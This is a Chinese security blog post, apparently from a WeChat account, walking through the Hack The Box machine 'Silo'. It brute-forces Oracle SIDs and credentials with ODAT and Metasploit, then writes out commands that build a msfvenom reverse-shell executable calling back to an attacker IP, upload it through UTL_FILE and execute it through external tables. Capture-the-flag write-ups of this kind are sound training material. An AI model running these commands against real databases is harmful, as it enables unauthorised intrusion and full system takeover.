> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tOvvvq2im__E_AJg7nhX-w)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **61** 篇文章，本公众号会每日分享攻防渗透技术给大家。

靶机地址：https://www.hackthebox.eu/home/machines/profile/131

靶机难度：中级（5.0/10）

靶机发布日期：2018 年 8 月 18 日

靶机描述：

Silo focuses mainly on leveraging Oracle to obtain a shell and escalate privileges. It was intended to be completed manually using various tools, however Oracle Database Attack Tool greatly simplifies the process, reducing the difficulty of the machine substantially.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

一、信息收集

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zd5z6Bx2hnItH6y0sJGQ0eLicQeGicibB291HxmibtfOLz9oWpTb3Zmvl0Nw/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.82，windows 系统的靶机.... 可以在图中看到 real-life 值很高，偏向于现实环境... 嘿嘿，一台真实的靶机？

官方给的思路：Silo 主要利用 Oracle 获得外壳并提升特权...

今天要对 Oracle 数据库服务器进行渗透了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdVIxg6QKGKPWZPcAZO9vcdbuZkuwkjwylbNqmDE66gQJzHcickFvYIRg/640?wx_fmt=png)

nmap 扫描可以看出，开放了很多端口...80：Microsoft IIS httpd 8.5

以及 1521oracle 的端口开放了 oracle-tns 服务... 直接对这两个渗透...

ODAT：https://github.com/quentinhardy/odat  --- 官方给了 ODAT 脚本的链接...ODAT 是一个开源的代码渗透测试工具，主要用于攻击测试和审计 Oracle 数据库服务器的安全性...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZddOUj3HmcXchUV5M9ibJB4a86giamehZzjJicvibLe7855RQcnbiaLx7Y24g/640?wx_fmt=png)

下载好 ODAT 后... 开始利用 odat.py 对 oracle 渗透....（这是个非常好的脚本... 对开发和数据库运维人员有很大的帮助检查问题）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdTU6GJG6LxagJKAXm4AmgLV2UQScSQbaeQN0T0xxwFgw5KKo6JL5pow/640?wx_fmt=png)

需要下载安装 ODAT 版本才可以运行脚本...

这里安装可以参考 https://github.com/quentinhardy/odat 下面的内容....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdOCiaMJZibpBYdRnVibrKFQTjAicKlwBl044VXCegXBKQDW5OmLhocNcYCw/640?wx_fmt=png)

我就不介绍安装步骤了，我这里安装了 4 次... 也算是熟悉了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zd1m1iaj5Z4LaBOywgO9xFJlTO8niahexF5n4wCeWRNbEHicso1KXb9njkQ/640?wx_fmt=png)

经过利用 oday 扫描发现两个 SID：

```
XE、XEXDB
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdNLvNEazGniana8EuuPr7rQyGxz3yPnjSuesd1aCuFGdcz6B3Sfhumtg/640?wx_fmt=png)

```
auxiliary/scanner/oracle/sid_brute
```

另外一种方法是利用 MSF 内核，发现这个更快就能发现....

现在知道了存在 SID，还需要知道凭证才可以登陆... 目的是登陆数据库...

这里需要暴力破解....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zd8Tv986EdVuGiaMqh0fJUz3TnBibMiapTAUh17B36TJcwRdHNJJrVut6Dw/640?wx_fmt=png)

也可以利用 MSF... 去爆破...

二、提权

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/17cKMwFOF7C0cpwjNSL0d7uN64rs4JnWiaiasQB1OyCTxuHmh4V5h2KHibcIsOL8qyJKiaCslE1o7BfYvNjzoMeib5w/640?wx_fmt=png)

方法 1：

![](https://mmbiz.qpic.cn/mmbiz_png/8Tn9tLDmZAdE5EwSMkwRmic3fCakpD1FZNUIaHa7Q4TOiblyROUQSY0Eic49nd5jozCTTYa8icpKle09trnZlgXdEw/640?wx_fmt=png)

方法 1 我使用了最暴力的方法提权... 利用 odat.py....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdFMibPHVLPRlSBG5dm9pg6ZO79nEIQz6VMb2Xmr1oPwFsqH8FVJTq9fQ/640?wx_fmt=png)

```
ython3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/dayupasswd.txt
```

爆破发现用户名密码：

```
scott/tiger
```

 （这里我使用自己的密码本是我做过几次了.. 使用 accounts 自带的密码本是可以爆破的，就是花了几个小时... 所以我就演示方法）  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdCeMicDV7ClPHWDfMc4l228QnR7A2Z8PoibIbdrVZlHhsaVnyX3pJ6zrw/640?wx_fmt=png)

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.16 lport=6666 -f exe > dayu.exe
```

生成 EXE 反向 shell 文件...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zd0M116e0PicfB1yH8T9Pue2j3UQxunG3TmoD8b8iaRP3xWaAXzPLSBzcw/640?wx_fmt=png)

```
python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ dayu.exe dayu.exe
```

使用 odat.py 上传成功反向 shell 脚本...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdZZmRH1d33psD1hOMN4Gbq4X74qN79IdQ3OOGSKamxoglsAO74K7yiaQ/640?wx_fmt=png)

```
python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ dayu.exe
```

可以看到通过 odat 脚本上传了反向 shell 后，在通过 odat 执行了 shell，获得反向外壳，成功提权获得 root.txt....  

![](https://mmbiz.qpic.cn/mmbiz_png/17cKMwFOF7C0cpwjNSL0d7uN64rs4JnWiaiasQB1OyCTxuHmh4V5h2KHibcIsOL8qyJKiaCslE1o7BfYvNjzoMeib5w/640?wx_fmt=png)

方法 2：

![](https://mmbiz.qpic.cn/mmbiz_png/8Tn9tLDmZAdE5EwSMkwRmic3fCakpD1FZNUIaHa7Q4TOiblyROUQSY0Eic49nd5jozCTTYa8icpKle09trnZlgXdEw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zdtr35TfVlkAlSoC1Ercxibzmib4rj1pbeUa0HyYMTcenV29sIBCzpLicbA/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdTf3xl7uCN6c4HJicYhHqHQyLAHlxvQkPr74RergzNZNxbAHpdbzGFmQ/640?wx_fmt=png)

可以看到此用户允许修改用户密码、创建表格、CVE-2018-3004 创建文件、CVE-2012-3137 允许使用密匙等等.....

可以通过上传文件... 或者写 shell.... 或者使用密匙登录获得低权 shell...

可以通过 smbserver.py 创建共享，文件上传... 然后数据库里头存在 administrator 的密码... 我就不写出来了，最近有挺多事的...

这里想怎么玩怎么玩，非常非常好的一台数据库靶机... 可以学到很多东西....

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

**2021.6.9~2021.6.16 号开启收徒模式，实战教学，有想法的私聊！**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)